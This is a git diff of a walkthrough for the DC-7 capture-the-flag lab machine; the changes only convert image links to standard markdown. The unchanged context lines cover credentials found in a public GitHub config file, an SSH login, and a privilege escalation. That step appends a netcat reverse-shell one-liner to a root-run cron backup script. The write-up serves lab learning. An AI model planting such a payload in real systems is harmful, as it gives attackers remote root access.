@@ -28,7 +28,7 @@ wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --
 Two automated tools, two dead ends. Time to slow down and read the site itself, which included a small nudge: “Think outside the box.”
 and when i was discovering the webpage i found @DC7USER at the bottom of the page and then i googled it and found a GitHub page and inside that there was a `staffdb` repo and inside that there was a ==config.php== which save the Database Credentials normally.in there i found the password for dc7
 
-![[Pasted image 20260922222141.png]]
+![](attachments/Pasted%20image%2020260922222141.png)
 
 ## Step 3: A Username Is All It Takes
 
@@ -48,7 +48,7 @@ ssh dc7user@dc-7
 Straight in.
 and it displayed a msg i have a mail 
 
-![[Pasted image 20261001112959.png]]
+![](attachments/Pasted%20image%2020261001112959.png)
 
 ```
 
@@ -148,7 +148,7 @@ This is wb here the mail hint from earlier paid off. The backup script ran as ro
 `echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.1 8888 >/tmp/f" >> /opt/scripts/backups.sh`
 
 
-![[Pasted image 20260926182424.png]]
+![](attachments/Pasted%20image%2020260926182424.png)
 
 Then set up a second listener and waited. When the cron job ran on its next scheduled cycle, it executed the added payload with full root privileges, and the shell connected back.
 
@@ -159,4 +159,4 @@ whoami
 cd /root  
 cat theflag.txt
 
-![[WhatsApp Image 2026-09-22 at 23.15.35.jpeg]]
+![](attachments/WhatsApp%20Image%202026-09-22%20at%2023.15.35.jpeg)
